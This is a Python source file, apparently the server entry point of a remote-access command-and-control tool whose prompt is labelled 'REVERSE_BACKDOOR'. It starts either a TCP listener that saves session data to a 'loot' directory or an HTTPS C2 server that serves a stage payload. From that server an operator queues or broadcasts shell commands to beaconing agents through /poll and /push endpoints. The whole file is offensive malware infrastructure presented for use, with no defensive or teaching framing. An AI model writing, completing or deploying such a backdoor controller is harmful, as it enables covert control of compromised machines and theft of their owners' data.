import os
import sys
import signal

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server.core.config import load_config
from server.core.listener import start_listener
from server.core.session import run_session, run_master_loop


def main():
    config = load_config()

    if config.get('http_mode'):
        _run_http(config)
    else:
        _run_tcp(config)


def _run_tcp(config):
    def session_callback(sock, ip, encryption):
        loot_dir = config.get('loot_dir', './loot')
        run_session(sock, ip, loot_dir, encryption)

    shutdown_event = start_listener(
        config['bind_host'],
        config['bind_port'],
        session_callback,
        config.get('encryption', False),
        config.get('tls', False),
    )
    signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
    signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
    run_master_loop(config.get('loot_dir', './loot'), config.get('encryption', False))
    shutdown_event.set()


def _run_http(config):
    from common.http_protocol import HttpC2Server
    from server.ui.prompt import print_colored, cyan, bold, green
    import threading
    from server.core.agent_registry import AgentRegistry

    host = config.get('bind_host', '0.0.0.0')
    port = config.get('bind_port', 443)
    tls = config.get('tls', True)
    stage_file = config.get('stage_payload')

    stage_payload = None
    if stage_file and os.path.isfile(stage_file):
        with open(stage_file, 'rb') as f:
            stage_payload = f.read()
        print_colored(f'[+] Stage payload loaded: {stage_file} ({len(stage_payload):,} bytes)', 'green')

    http_server = HttpC2Server(host=host, port=port, use_tls=tls,
                               stage_payload=stage_payload)
    http_server.start()

    print_colored(f'[+] HTTP C2 listening on {green(http_server.address)}', 'green')
    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("queue <id> <cmd>")} to task', 'cyan')

    registry = AgentRegistry()
    agent_counter = 0
    agent_lock = threading.Lock()

    data_lock = threading.Lock()
    agent_data: dict[str, list] = {}

    def _reader_loop():
        nonlocal agent_counter
        while http_server._server is not None:
            result = http_server.poll_result(timeout=1.0)
            if result:
                pass

    threading.Thread(target=_reader_loop, daemon=True).start()

    while True:
        try:
            command = input(f'{bold("REVERSE_BACKDOOR")}> ').strip()
        except (EOFError, KeyboardInterrupt):
            print_colored('\n[*] Shutting down...', 'yellow')
            break

        if not command:
            continue

        if command in ('exit', 'quit'):
            break

        if command == 'agents':
            with agent_lock:
                if agent_counter == 0:
                    print('  (no agents connected)')
                else:
                    print(f'  [*] {agent_counter} agent(s) connected via HTTP beacon')
            continue

        if command.startswith('queue '):
            parts = command[6:].strip().split(None, 1)
            if len(parts) < 2:
                print_colored('[-] Usage: queue <agent-id> <command>', 'red')
                continue
            _, cmd = parts
            http_server.queue_command(cmd)
            with agent_lock:
                agent_counter = max(agent_counter, 1)
            print_colored(f'[+] Command queued: {cmd}', 'green')
            continue

        if command == 'help':
            print(f'''
  {bold('HTTP C2 Commands:')}
    {cyan('agents')}                  Show connected agent count
    {cyan('queue <id> <cmd>')}        Queue command for next beacon check-in
    {cyan('broadcast <cmd>')}         Queue command for all agents
    {cyan('help')}                   Show this help
    {cyan('exit / quit')}            Shutdown server

  {bold('Agent beacon URL:')}
    {green(http_server.address)}/poll  → GET  (agent checks in)
    {green(http_server.address)}/push  → POST (agent sends result)
''')
            continue

        if command.startswith('broadcast '):
            cmd = command[10:].strip()
            http_server.queue_command(cmd)
            print_colored(f'[+] Broadcast queued: {cmd}', 'green')
            continue

        print_colored(f'[-] Unknown: {command}. Type help.', 'red')

    http_server.stop()


if __name__ == '__main__':
    main()
